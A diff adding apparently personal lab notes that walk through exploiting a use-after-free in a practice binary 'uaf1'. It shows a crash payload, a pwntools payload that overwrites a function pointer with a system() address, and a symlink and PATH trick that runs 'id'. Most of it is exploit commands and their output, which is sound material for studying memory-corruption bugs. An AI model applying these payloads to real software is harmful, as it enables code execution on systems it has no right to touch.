@@ -1,0 +1,50 @@
+alex@vm64:~/hack/project/randomStuff/uaf$ ./uaf1 
+Enter id num: 1
+Enter your name: 10
+vuln memory address: 0x1971010
+ptr1 memory address: 0x1971940
+
+alex@vm64:~/hack/project/randomStuff/uaf$ ./uaf1 
+Enter id num: 101
+Enter your name: 10
+vuln memory address: 0x1628010 
+ptr1 memory address: 0x1628010 
+
+vuln and ptr1 point same memory area. 
+so we can overwrite cleanmemory's function address and execute when id is greater then 100.
+
+like below
+
+strace -ifx ./uaf1 `perl -e 'print "A"x24 . "BBBB"'`
+[00007fdc9945ba10] write(1, "Enter your name: ", 17Enter your name: ) = 17
+[00007fdc9945b9b0] read(0, 1 "1\n", 1024) = 2
+[00007fdc9945ba10] write(1, "vuln memory address: 0x1f8e010\n", 31vuln memory address: 0x1f8e010) = 31
+[00007fdc9945ba10] write(1, "ptr1 memory address: 0x1f8e010\n", 31ptr1 memory address: 0x1f8e010) = 31
+[0000000042424242] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
+[????????????????] +++ killed by SIGSEGV +++ Segmentation fault
+
+To exploit this vuln program is easy.
+
+$ ./uaf1 `python -c 'import pwn;print "A"*24 + pwn.p64(0x7ffff7a53380)'` 2>&1 | xxd
+101
+1
+00000000: 7368 3a20 313a 2078 1bdd f7ff 7f3a 206e  sh: 1: x.....: n
+                           ~~~~~~~~~~~~~~~ => filename
+00000010: 6f74 2066 6f75 6e64 0a45 6e74 6572 2069  ot found.Enter i
+00000020: 6420 6e75 6d3a 2045 6e74 6572 2079 6f75  d num: Enter you
+00000030: 7220 6e61 6d65 3a20 7675 6c6e 206d 656d  r name: vuln mem
+00000040: 6f72 7920 6164 6472 6573 733a 2030 7836  ory address: 0x6
+00000050: 3032 3031 300a 7074 7231 206d 656d 6f72  02010.ptr1 memor
+00000060: 7920 6164 6472 6573 733a 2030 7836 3032  y address: 0x602
+00000070: 3031 300a                                010.
+
+ln -sf `which id` `perl -e 'print "\x78\x1b\xdd\xf7\xff\x7f"'`
+export PATH=.:$PATH
+  
+$ ./uaf1 `python -c 'import pwn;print "A"*24 + pwn.p64(0x7ffff7a53380)'` 
+Enter id num: 101
+Enter your name: 1
+vuln memory address: 0x602010
+ptr1 memory address: 0x602010
+uid=1000(alex) gid=1000(alex) groups=1000(alex),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(sambashare),113(lpadmin),141(docker)
+
